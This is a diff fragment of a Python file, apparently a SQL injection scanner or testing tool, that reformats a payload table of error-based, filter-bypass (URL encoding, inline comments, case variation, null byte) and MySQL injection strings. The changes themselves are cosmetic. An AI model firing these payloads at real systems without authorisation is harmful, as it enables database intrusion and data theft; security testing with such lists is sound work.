@@ -7,7 +7,7 @@ PAYLOADS = {
     "detection": {
         "error_based": [
             "'",
-            "\"",
+            '"',
             "' OR '1'='1",
             "' OR '1'='1' --",
             "' OR '1'='1' #",
@@ -38,10 +38,10 @@ PAYLOADS = {
     },
     "encoding_bypass": [
         "1%27%20OR%20%271%27%3D%271",  # URL encoded
-        "1'/**/OR/**/'1'='1",          # Comment bypass
-        "1' oR '1'='1",                # Case variation
-        "1'\x00OR\x00'1'='1",          # Null byte
-        "1' OR '1'='1' -- -",          # MySQL comment variant
+        "1'/**/OR/**/'1'='1",  # Comment bypass
+        "1' oR '1'='1",  # Case variation
+        "1'\x00OR\x00'1'='1",  # Null byte
+        "1' OR '1'='1' -- -",  # MySQL comment variant
     ],
     "mysql": [
         "' OR 1=1#",
